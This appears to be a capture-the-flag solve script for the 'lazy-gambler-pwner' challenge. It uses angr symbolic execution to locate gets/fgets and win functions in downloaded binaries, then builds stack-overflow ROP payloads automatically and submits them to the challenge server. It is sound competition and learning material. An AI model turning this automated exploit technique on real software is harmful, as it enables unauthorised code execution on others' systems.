from pwn import *
import angr
import claripy as cl
import os

# context.log_level = "DEBUG"
BIN_PATH = "code.bin"


def get_binary(io):
    io.recvuntil(b"----------------")
    b64_binary = io.recvuntil(b"----------------", drop=True)
    with open(BIN_PATH, "wb") as f:
        f.write(base64.b64decode(b64_binary))


def main():
    io = remote("lazy-gambler-pwner.chal.idek.team", 1337)
    for c in range(50):
        os.system("mv code.bin code.bin_old")
        get_binary(io)
        os.system("chmod +x code.bin")

        payload = b""

        # You now have "./code.bin" which is the vulnerable, good luck!
        #
        # Some tips:
        # - The way I check if the exploit was successful requires for the binary to *NOT*
        #   crash due to segfault & co.
        #
        # - My solve takes around 5 to 10 seconds per binaries on your average computer.
        #   If yours takes much longer, you may not be on the right path...
        #
        # - The vulnerable functions and the win functions changes a bit as to not make it
        #   *too* easy to discover, but they are still fairly straightforward. My solve
        #   has 10 to 20 lines for each. Don't overengineer!
        #
        # - There are some edge cases you may not have expected (I didn't either, but they 
        #   were fun enough to be kept lol), so do take time to debug and figure out
        #   everything properly if your solve fail!
        #
        # - If you are confident the issue is on remote and not your script... Triple check!
        #   If it still persist, open a ticket and I'll do my best to figure out if it is
        #   on my side or not, and fix if needed.
        #

        context.arch = "amd64"

        file = "./code.bin"
        exe = ELF(file)
        p: angr.Project = angr.Project(file, use_sim_procedures=True)

        data_bytes = [cl.BVS('stdin_data_%d' % i, 8) for i in range(0x40)]
        stdin_content = cl.Concat(*data_bytes)

        #stdin=angr.SimFileStream(name="stdin", content=stdin_content, has_end=False)
        state: angr.SimState = p.factory.entry_state()
        state.options.add(angr.options.UNICORN)
        state.options.add(angr.options.ZERO_FILL_UNCONSTRAINED_MEMORY)
        state.options.add(angr.options.ZERO_FILL_UNCONSTRAINED_REGISTERS)

        # for b in data_bytes:
        #     state.solver.add(cl.Or(cl.And(b >= ord("a"), b <= ord("z")), b == ord("\0")))

        simgr = p.factory.simgr(state)

        target_vuln = []
        target_vuln.append(p.loader.find_symbol("fgets").rebased_addr)
        target_vuln.append(p.loader.find_symbol("gets").rebased_addr)
        target_win = []
        target_win.append(p.loader.find_symbol("execve").rebased_addr)
        target_win.append(p.loader.find_symbol("system").rebased_addr)
        for v in target_vuln:
            print("vuln: %#018x" % v)
        for w in target_win:
            print("win: %#018x" % w)

        try:
            simgr.explore(find=[*target_vuln, *target_win])
        except KeyboardInterrupt:
            pass

        if not simgr.found:
            print("skill issue")
            for i in simgr.active:
                print(i.posix.dumps(0), i.posix.dumps(1))
            exit()

        def no_op(s):
            pass

        paths = {i.addr: i.posix.dumps(0) for i in simgr.found}
        path = b""
        win_path = False
        for k, v in paths.items():
            if k in target_win:
                path = v
                win_path = True
                break
        if path == b"":
            path = list(paths.values())[0]
            if path == b"":
                state.inspect.b("instruction", when=angr.BP_BEFORE, action=no_op)
                simgr = p.factory.simgr(state)
                while True:
                    simgr.step()
                    simgr.move("active", "found", lambda s: s.addr in [*target_vuln, *target_win])
                    if simgr.found:
                        break
                print(simgr.found[0].callstack)
            vuln = simgr.found[0].callstack[1].func_addr

        print(win_path, path)

        context.log_level = logging.WARNING

        pty = process.PTY
        # io = process([file, *args], stdin=pty, stdout=pty, stderr=pty)
        # gdb.attach(io)
        # input("gdb")

        if win_path:
            payload = path
            # io.send(path)
            # io.recvuntil(b"?\n")
            # io.interactive()
        else:
            i = p.loader.main_object.entry
            should_break = False
            win_func = 0
            while True:
                j = i + 1
                while True:
                    if j >= p.loader.main_object.max_addr:
                        i = -1
                        break
                    a = state.memory.concrete_load(j, 4)
                    if a == b"\xf3\x0f\x1e\xfa":
                        i = j
                        break
                    j += 1
                if i == -1:
                    break
                state: angr.SimState = p.factory.entry_state(addr=j)
                state.options.add(angr.options.UNICORN)
                state.options.add(angr.options.ZERO_FILL_UNCONSTRAINED_MEMORY)
                state.options.add(angr.options.ZERO_FILL_UNCONSTRAINED_REGISTERS)
                simgr = p.factory.simgr(state)
                simgr.explore(n=10, find=target_win)
                if simgr.found:
                    print("win:", hex(j), hex(simgr.found[0].addr))
                    should_break = True
                    win_func = state.addr
                    break
                if should_break:
                    break
            if win_func == 0:
                print("win not found")
            
            state: angr.SimState = p.factory.entry_state(addr=vuln)
            rsp_start = state.regs.rsp.concrete_value
            state.options.add(angr.options.UNICORN)
            state.options.add(angr.options.ZERO_FILL_UNCONSTRAINED_MEMORY)
            state.options.add(angr.options.ZERO_FILL_UNCONSTRAINED_REGISTERS)
            simgr = p.factory.simgr(state)
            simgr.explore(n=10, find=target_vuln)
            if not simgr.found:
                print("what the fuck")
            print(hex(simgr.found[0].regs.rdi.concrete_value), hex(simgr.found[0].addr))
            rsp_diff = abs(simgr.found[0].regs.rdi.concrete_value - rsp_start)
            rsp_diff -= 8
            print("diff: %#x" % rsp_diff)

            path += b"A"*rsp_diff + p64(0) + p64(next(exe.search(b"\xc3", executable=True))) + p64(win_func) + p64(exe.plt.exit)
            
            # io.sendline(path)
            # io.interactive()
            payload = path
            print(path)

        

        b64_payload = base64.b64encode(payload)
        io.sendlineafter(b"solution:\n", b64_payload)
        log.success(f"Challenge {c+1} solved!")

    io.interactive()


main()
